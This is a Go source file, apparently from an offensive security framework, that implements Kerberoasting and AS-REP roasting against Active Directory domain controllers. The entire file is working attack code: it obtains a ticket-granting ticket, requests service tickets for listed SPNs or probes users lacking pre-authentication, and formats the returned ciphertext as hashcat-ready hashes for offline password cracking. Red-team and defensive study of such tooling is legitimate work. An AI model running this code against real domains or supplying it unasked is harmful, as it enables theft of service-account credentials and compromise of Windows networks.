package kerberos

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"time"

	"github.com/Debajyoti0-0/aether/internal/engine/spine"
	"github.com/Debajyoti0-0/aether/internal/protocol/kerberos"
	"github.com/Debajyoti0-0/aether/internal/types"
)

type KerberoastMutation struct {
	Domain         string
	DC             string
	SPNs           []string
	Credentials    map[string]string
	RequestingUser string
	CCachePath     string
	MaxRequests    int
	RateLimit      time.Duration
	Results        []KerberoastResult
	Errors         []string
}

type KerberoastResult struct {
	SPN      string
	Account  string
	Realm    string
	Etype    int32
	Hash     string
	HashMode int
	Ticket   []byte
	Error    string
}

func (m *KerberoastMutation) Kind() string   { return "ad.kerberos.kerberoast" }
func (m *KerberoastMutation) Target() string { return m.DC + "/" + m.Domain }

func (m *KerberoastMutation) BeforeState() ([]byte, error) {
	return json.Marshal(map[string]any{
		"domain":       m.Domain,
		"dc":           m.DC,
		"spns":         m.SPNs,
		"has_creds":    len(m.Credentials) > 0,
		"has_ccache":   m.CCachePath != "",
		"max_requests": m.MaxRequests,
		"rate_limit":   m.RateLimit.String(),
	})
}

func (m *KerberoastMutation) Execute(ctx context.Context) (string, error) {
	transport, err := newKerberosTransport(m.DC, m.Domain)
	if err != nil {
		return "", err
	}
	defer transport.Close()

	results := make([]KerberoastResult, 0, len(m.SPNs))
	errors := make([]string, 0)

	// ------------------------------------------------------------------
	// Step 1 — obtain a TGT for the requesting account. Kerberoast sends
	// TGS-REQs on the user's behalf; a TGS-REQ carries an AP-REQ with the
	// user's TGT. The previous implementation sent an empty ticket with an
	// authenticator encrypted under the long-term key — no KDC accepts it.
	// ------------------------------------------------------------------
	var logSessionKey []byte
	var logKeyEtype int32
	var tgt kerberos.Ticket
	var clientPrincipal kerberos.PrincipalName
	var clientRealm = kerberos.Realm(m.Domain)

	if m.CCachePath != "" {
		ccache, err := kerberos.ReadCCache(m.CCachePath)
		if err != nil {
			return "", fmt.Errorf("read ccache: %w", err)
		}
		entry := ccache.GetDefaultEntry()
		if entry == nil {
			return "", fmt.Errorf("no default entry in ccache")
		}
		logSessionKey = entry.Key.KeyValue
		logKeyEtype = entry.Key.KeyType
		clientPrincipal = entry.ClientPrincipal
		clientRealm = entry.ClientRealm
		if len(entry.Ticket) == 0 {
			return "", fmt.Errorf("ccache entry carries no ticket")
		}
		// Re-parse the raw ticket from the ccache.
		parsed, err := kerberos.ParseTicketFromCCache(entry.Ticket)
		if err != nil {
			return "", fmt.Errorf("parse ccache ticket: %w", err)
		}
		tgt = parsed
	} else {
		var password string
		if m.RequestingUser != "" {
			clientPrincipal = kerberos.MakeUserPrincipal(m.RequestingUser, m.Domain)
			password = m.Credentials["*"]
		} else if creds, ok := m.Credentials["*"]; ok {
			clientPrincipal = kerberos.MakeUserPrincipal("ignored", m.Domain)
			password = creds
			clientPrincipal.NameString = []string{"requestor"}
		} else {
			return "", fmt.Errorf("requesting account credentials required (--creds user:password or --ccache)")
		}
		if password == "" {
			return "", fmt.Errorf("no password for requesting account")
		}

		salt := kerberos.MakeSalt(clientRealm, clientPrincipal)
		longTermKey, err := kerberos.StringToKey(kerberos.ETYPE_AES256_CTS_HMAC_SHA1_96, password, salt, "")
		if err != nil {
			return "", fmt.Errorf("key derivation: %w", err)
		}

		serverPrincipal := kerberos.MakeUserPrincipal("krbtgt", m.Domain)
		asreq, err := kerberos.BuildASREQWithPreauth(clientPrincipal, clientRealm, serverPrincipal,
			kerberos.SupportedEtypes(), 12345, time.Now().Add(5*time.Minute), password)
		if err != nil {
			return "", fmt.Errorf("build AS-REQ: %w", err)
		}
		if err := transport.Send(asreq); err != nil {
			return "", fmt.Errorf("send AS-REQ: %w", err)
		}
		resp, err := transport.Recv()
		if err != nil {
			return "", fmt.Errorf("recv AS-REP: %w", err)
		}
		rep, err := kerberos.ParseASREP(resp)
		if err != nil {
			if kerr, ok := kerberos.IsKDCError(err); ok {
				return "", fmt.Errorf("AS exchange: %v", kerr)
			}
			return "", fmt.Errorf("parse AS-REP: %w", err)
		}
		encPart, err := kerberos.DecryptASREPEncPart(rep, longTermKey, kerberos.ETYPE_AES256_CTS_HMAC_SHA1_96)
		if err != nil {
			return "", fmt.Errorf("decrypt AS-REP: %w", err)
		}
		logSessionKey = encPart.Key.KeyValue
		// Derive the etype from the key length: a mis-parsed KeyType=0 would
		// make Encrypt fail with "unsupported encryption type".
		switch len(logSessionKey) {
		case 32:
			logKeyEtype = kerberos.ETYPE_AES256_CTS_HMAC_SHA1_96
		case 16:
			logKeyEtype = kerberos.ETYPE_AES128_CTS_HMAC_SHA1_96
		default:
			logKeyEtype = encPart.Key.KeyType
		}
		tgt = *rep.Ticket
	}

	// ------------------------------------------------------------------
	// Step 2 — for each SPN: TGS-REQ (AP-REQ with the TGT) → TGS-REP.
	// The crackable material is the TICKET's encrypted part (encrypted
	// with the service account's long-term key) — hashcat mode 13100.
	// ------------------------------------------------------------------
	for i, spn := range m.SPNs {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
		}

		if m.MaxRequests > 0 && i >= m.MaxRequests {
			errors = append(errors, fmt.Sprintf("max requests (%d) reached", m.MaxRequests))
			break
		}
		if m.RateLimit > 0 {
			time.Sleep(m.RateLimit)
		}

		parsedSPN, err := kerberos.ParseSPN(spn)
		if err != nil {
			errors = append(errors, fmt.Sprintf("invalid SPN %s: %v", spn, err))
			continue
		}
		serverPrincipal := kerberos.MakeSPNPrincipal(parsedSPN.ServiceClass, parsedSPN.Host, m.Domain)

		// BuildTGSREQWithChecksum creates the authenticator with the
		// RFC-required req-body checksum (usage 6) and encrypts it under the
		// TGT session key (usage 7) — Samba/AD reject TGS-REQs without it.
		tgsreq, err := kerberos.BuildTGSREQWithChecksum(
			clientPrincipal, clientRealm, serverPrincipal,
			tgt, kerberos.SupportedEtypes(), 12345,
			time.Now().Add(5*time.Minute), logSessionKey, logKeyEtype,
		)
		if err != nil {
			errors = append(errors, fmt.Sprintf("build TGS-REQ: %v", err))
			continue
		}
		if err := transport.Send(tgsreq); err != nil {
			errors = append(errors, fmt.Sprintf("send TGS-REQ: %v", err))
			continue
		}
		resp, err := transport.Recv()
		if err != nil {
			errors = append(errors, fmt.Sprintf("recv TGS-REP: %v", err))
			continue
		}
		rep, err := kerberos.ParseTGSREP(resp)
		if err != nil {
			if kerr, ok := kerberos.IsKDCError(err); ok {
				errors = append(errors, fmt.Sprintf("%s: %v", spn, kerr))
			} else {
				errors = append(errors, fmt.Sprintf("%s: parse TGS-REP: %v", spn, err))
			}
			continue
		}

		// The service ticket's enc-part is encrypted with the service
		// account's long-term key — this is the kerberoast hash material.
		ticketCipher := rep.Ticket.EncPart.Cipher
		ticketEtype := rep.Ticket.EncPart.EType
		results = append(results, KerberoastResult{
			SPN:      spn,
			Account:  parsedSPN.Host,
			Realm:    m.Domain,
			Etype:    ticketEtype,
			Hash:     hex.EncodeToString(ticketCipher),
			HashMode: 13100,
			Ticket:   ticketCipher,
		})
	}

	m.Results = results
	m.Errors = errors
	return fmt.Sprintf("kerberoast-%s-%d", m.Domain, time.Now().Unix()), nil
}

func (m *KerberoastMutation) AfterState() ([]byte, error) {
	return json.Marshal(map[string]any{
		"results": m.Results,
		"errors":  m.Errors,
		"count":   len(m.Results),
	})
}

func (m *KerberoastMutation) UndoRecipe() *spine.UndoSpec {
	return nil
}

func (m *KerberoastMutation) Name() string       { return "ad.kerberos.kerberoast" }
func (m *KerberoastMutation) Capability() string { return "ad.kerberos.roast" }
func (m *KerberoastMutation) RiskScore() int     { return 20 }
func (m *KerberoastMutation) Reversible() bool   { return true }

func (m *KerberoastMutation) GenerateEvidence() []types.EvidenceRecord {
	evidence := make([]types.EvidenceRecord, 0, len(m.Results))
	for _, r := range m.Results {
		h := sha256.Sum256(r.Ticket)
		id := fmt.Sprintf("kerberoast-%s-%d", r.SPN, time.Now().UnixNano())
		payload, _ := json.Marshal(map[string]any{
			"spn":      r.SPN,
			"account":  r.Account,
			"etype":    kerberos.EtypeName(r.Etype),
			"hash_sha": hex.EncodeToString(h[:]),
		})
		evidence = append(evidence, types.EvidenceRecord{
			ID:             id,
			ActionID:       "",
			Kind:           "ad.kerberos.kerberoast",
			Target:         m.Target(),
			EpistemicClass: types.ClassObserved,
			Confidence:     1.0,
			CollectedAt:    time.Now(),
			Method:         "kerberos-tgsreq",
			Payload:        payload,
		})
	}
	return evidence
}

type ASREPRoastMutation struct {
	Domain  string
	DC      string
	Users   []string
	Results []ASREPRoastResult
	// Skipped lists accounts that were probed and found not roastable.
	Skipped []ASREPSkipped
}

type ASREPRoastResult struct {
	Username  string
	Principal string
	Realm     string
	Etype     int32
	Hash      string
	HashMode  int
	ASREP     []byte
	Error     string
}

// ASREPSkipped records an account that was probed and found NOT roastable,
// with the reason. Emitting these is what makes the zero-positive case
// auditable instead of silently empty.
type ASREPSkipped struct {
	Username string `json:"username"`
	Reason   string `json:"reason"`
}

// FormatASREPRoastHash renders AS-REP enc-part material in the hashcat form
// operators can crack directly.
//
//	etype 23 (RC4-HMAC), mode 18200:
//	  $krb5asrep$23$USER$REALM:<hex(0:24)>$<hex(24:30)>:<hex(30:)>
//	etype 17/18 (AES), mode 13100:
//	  $krb5asrep$<etype>$USER$REALM$<hex(cipher)>
//
// Only the enc-part cipher is ever hashed. A KRB-ERROR reply is a rejection,
// not a hash, and must never reach a cracking tool.
func FormatASREPRoastHash(username, realm string, etype int32, cipher []byte) (string, int) {
	switch etype {
	case kerberos.ETYPE_RC4_HMAC:
		// hashcat 18200 splits the RC4 cipher into three parts.
		part1 := cipher
		if len(part1) > 24 {
			part1 = part1[:24]
		}
		part2 := []byte{}
		part3 := []byte{}
		if len(cipher) > 24 {
			end := 24 + 6
			if end > len(cipher) {
				end = len(cipher)
			}
			part2 = cipher[24:end]
			part3 = cipher[end:]
		}
		return fmt.Sprintf("$krb5asrep$%d$%s$%s:%x$%x:%x",
			etype, username, realm, part1, part2, part3), 18200
	default:
		return fmt.Sprintf("$krb5asrep$%d$%s$%s$%x", etype, username, realm, cipher), 13100
	}
}

func (m *ASREPRoastMutation) Kind() string   { return "ad.kerberos.asreproast" }
func (m *ASREPRoastMutation) Target() string { return m.DC + "/" + m.Domain }

func (m *ASREPRoastMutation) BeforeState() ([]byte, error) {
	return json.Marshal(map[string]any{"domain": m.Domain, "dc": m.DC, "users": m.Users})
}

func (m *ASREPRoastMutation) Execute(ctx context.Context) (string, error) {
	transport, err := newKerberosTransport(m.DC, m.Domain)
	if err != nil {
		return "", err
	}
	defer transport.Close()

	results := make([]ASREPRoastResult, 0)
	skipped := make([]ASREPSkipped, 0)
	serverPrincipal := kerberos.MakeUserPrincipal("krbtgt", m.Domain)

	for _, username := range m.Users {
		select {
		case <-ctx.Done():
			return "", ctx.Err()
		default:
		}

		clientPrincipal := kerberos.MakeUserPrincipal(username, m.Domain)
		clientRealm := kerberos.Realm(kerberos.CanonicalRealm(kerberos.Realm(m.Domain)))

		// RFC 4120 §3.2.1: an AS-REQ with NO padata. A KDC_ERR_PREAUTH_REQUIRED
		// reply means pre-authentication IS enforced and the account is NOT
		// roastable; only a successful AS-REP carries crackable material.
		//
		// The previous code inverted this test: it reported an account as
		// roasted precisely when it received KDC_ERR_PREAUTH_REQUIRED, hashed
		// the ENTIRE KRB-ERROR wire reply instead of the AS-REP enc-part, and
		// hardcoded etype 23. Live Stage 46g evidence: 7 of 7 accounts reported
		// roastable although only user2 has DONT_REQ_PREAUTH, and four
		// different users produced byte-identical ciphertext.
		asreq, err := kerberos.BuildASREQ(clientPrincipal, clientRealm, serverPrincipal, kerberos.SupportedEtypes(), 12345, time.Now().Add(5*time.Minute), nil)
		if err != nil {
			results = append(results, ASREPRoastResult{Username: username, Error: err.Error()})
			continue
		}

		if err := transport.Send(asreq); err != nil {
			results = append(results, ASREPRoastResult{Username: username, Error: err.Error()})
			continue
		}

		resp, err := transport.Recv()
		if err != nil {
			results = append(results, ASREPRoastResult{Username: username, Error: err.Error()})
			continue
		}

		rep, err := kerberos.ParseASREP(resp)
		if err != nil {
			// Not roastable. Record why, but never surface a KRB-ERROR as a
			// crackable hash.
			reason := err.Error()
			if kerr, ok := kerberos.IsKDCError(err); ok {
				reason = fmt.Sprintf("KDC error %d: %s", kerr.Code, kerberos.KDCErrorName(kerr.Code))
			}
			skipped = append(skipped, ASREPSkipped{Username: username, Reason: reason})
			continue
		}
		if len(rep.EncPart.Cipher) == 0 {
			skipped = append(skipped, ASREPSkipped{Username: username, Reason: "AS-REP carried no encrypted part"})
			continue
		}

		hash, mode := FormatASREPRoastHash(username, string(clientRealm), rep.EncPart.EType, rep.EncPart.Cipher)
		results = append(results, ASREPRoastResult{
			Username:  username,
			Principal: clientPrincipal.FullName(clientRealm),
			Realm:     string(clientRealm),
			Etype:     rep.EncPart.EType,
			Hash:      hash,
			HashMode:  mode,
			ASREP:     rep.EncPart.Cipher,
		})
	}

	m.Results = results
	m.Skipped = skipped
	return fmt.Sprintf("asreproast-%s-%d", m.Domain, time.Now().Unix()), nil
}

func (m *ASREPRoastMutation) AfterState() ([]byte, error) {
	return json.Marshal(map[string]any{"results": m.Results, "count": len(m.Results)})
}

func (m *ASREPRoastMutation) UndoRecipe() *spine.UndoSpec {
	return nil
}

func (m *ASREPRoastMutation) Name() string       { return "ad.kerberos.asreproast" }
func (m *ASREPRoastMutation) Capability() string { return "ad.kerberos.roast" }
func (m *ASREPRoastMutation) RiskScore() int     { return 20 }
func (m *ASREPRoastMutation) Reversible() bool   { return true }

func (m *ASREPRoastMutation) GenerateEvidence() []types.EvidenceRecord {
	evidence := make([]types.EvidenceRecord, 0, len(m.Results))
	for _, r := range m.Results {
		h := sha256.Sum256(r.ASREP)
		id := fmt.Sprintf("asreproast-%s-%d", r.Username, time.Now().UnixNano())
		payload, _ := json.Marshal(map[string]any{
			"username":  r.Username,
			"principal": r.Principal,
			"etype":     kerberos.EtypeName(r.Etype),
			"hash_sha":  hex.EncodeToString(h[:]),
		})
		evidence = append(evidence, types.EvidenceRecord{
			ID:             id,
			ActionID:       "",
			Kind:           "ad.kerberos.asreproast",
			Target:         m.Target(),
			EpistemicClass: types.ClassObserved,
			Confidence:     1.0,
			CollectedAt:    time.Now(),
			Method:         "kerberos-asreq-no-preauth",
			Payload:        payload,
		})
	}
	return evidence
}
